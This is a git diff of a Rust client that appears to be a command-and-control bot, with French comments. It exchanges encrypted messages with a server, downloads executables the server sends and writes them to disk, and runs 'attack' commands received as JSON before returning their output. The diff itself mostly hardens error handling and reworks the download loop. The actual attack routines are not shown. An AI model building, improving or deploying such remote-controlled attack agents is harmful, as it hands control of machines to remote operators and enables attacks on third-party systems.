@@ -112,6 +112,8 @@ fn receive_encrypted_data_from_server(
             // println!("Data received: {:?}", data);
             println!("Data len : {}", data.len().to_string());
 
+            // println!("data : {}", data);
+
             let mut buffer = vec![0u8; data.len() + 16];
             match Aes128CbcDec::new(&symetric_key, &iv)
                 .decrypt_padded_b2b_mut::<Pkcs7>(&data, &mut buffer)
@@ -168,7 +170,7 @@ fn receive_encrypted_file_from_server(mut stream: TcpStream,
 ) -> Result<Vec<u8>, String> {
     // TODO
 
-    stream.set_read_timeout(Some(Duration::new(1, 0)));
+    stream.set_read_timeout(Some(Duration::new(60, 0)));
 
     let mut buffer = vec![0u8; size_expected];
     let mut data = Vec::new();
@@ -180,14 +182,24 @@ fn receive_encrypted_file_from_server(mut stream: TcpStream,
             println!("[+] start receiving file from server");
             data.extend_from_slice(&buffer[..size_expected]);
         }
+        Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
+            // WouldBlock means no data available right now, continue looping
+            return Err(e.to_string());
+        }
         Err(e) => {
             println!("[!] Error reading file from server: {:?}", e);
+            return Err(e.to_string());
         }
+        // Err(e) => {
+        //     println!("[!] Error reading file from server: {:?}", e);
+        //     // renvoyer une erreur
+        // }
     }
 
     if data.len() != size_expected{
         println!("[!] Error reading file from server (taille de fichier reçu diffente de celle attendue)");
-        panic!("Error")
+        // renvoyer une erreur
+        return Err("Error".to_string())
     }
     
     
@@ -201,8 +213,7 @@ fn receive_encrypted_file_from_server(mut stream: TcpStream,
 
         Err(err) => {
             eprintln!("Error decrypting data: {:?}", err);
-            Err(String::new())
-
+            Err("Error while decrying data".to_string())
         }
     }
 }
@@ -230,27 +241,28 @@ fn check_and_request_executable(
     if !executable_path.exists() {
         println!("\t[!] Executable not found, requesting from server...");
 
-        let request_message = format!("REQUEST_EXECUTABLE {}", executable_name);
-        send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
-        println!("\t\t[+] Request sent");
+        loop{
+            // Envoi du json de requete pour l'executable
+            let request_message = format!("{{\"request\":\"{}\"}}", executable_name);
+            send_encrypted_string_to_server(sender.clone(), request_message, symetric_key.clone(), iv.clone());
+            println!("\t\t[+] Request sent");
 
         
-        let file_size = receive_encrypted_string_from_server(receiver, symetric_key.clone(), iv.clone());
-        println!("\t\t[+] file size received : {:?}", file_size);
-
-
-        println!("\t\t[+] sending back file size");
-        send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());
-
-
+            // négociation de la taille du fichier
+            let file_size = receive_encrypted_string_from_server(receiver, symetric_key.clone(), iv.clone());
+            println!("\t\t[+] file size received : {:?}", file_size);
     
-        loop{
+    
+            println!("\t\t[+] sending back file size");
+            send_encrypted_string_to_server(sender.clone(), file_size.clone(), symetric_key.clone(), iv.clone());
+    
+            
+            // Attente d el'envoi du fichier
+            
             println!("\t\t[+] waiting for file data");
             match receive_encrypted_file_from_server(connexion.try_clone()?, symetric_key.clone(), iv.clone(), file_size.parse::<usize>().unwrap()){
                 Ok(data_file) => {
                     println!("\t\t[+] file data received");
-                    // envoyer le code OK de retour
-                    send_encrypted_string_to_server(sender.clone(), "OK".to_string(),symetric_key.clone(), iv.clone());
                     
                     let mut file = File::create(&executable_path)?;
                     file.write_all(&data_file)?;
@@ -267,11 +279,10 @@ fn check_and_request_executable(
 
                 }
                 Err(e) => {
-                    send_encrypted_string_to_server(sender.clone(), "KO".to_string(),symetric_key.clone(), iv.clone());
-                    // envoyer le code KO de retour
+                    println!("\t\t[!] Mauvais fichier recu");
                 }
             }
-            thread::sleep(Duration::new(1, 0));
+            // thread::sleep(Duration::new(1, 0));
         }
 
 
@@ -422,11 +433,8 @@ fn main() -> io::Result<()> {
                 let id_attack = json_attack.id;
                 let type_attack = json_attack.attack;
 
-                // println!("Received command: {}", message);
-                println!("neuillllleee {:?}", json_attack.arg1);
-
                 let args = format!("{} {} {}", &json_attack.arg1, &json_attack.arg2, &json_attack.arg3);
-                println!("####{}", args);
+
                 match execute_attack(type_attack.clone().as_str(), &args , &sender, &receiver, &symetric_key, &iv, connexion3.try_clone().expect("REASON")) {
                     Ok(output) => {
                         let response = format!("{{\"id\":\"{}\",\"attack\":\"{}\",\"output\":\"{}\"}}", id_attack, type_attack, output);
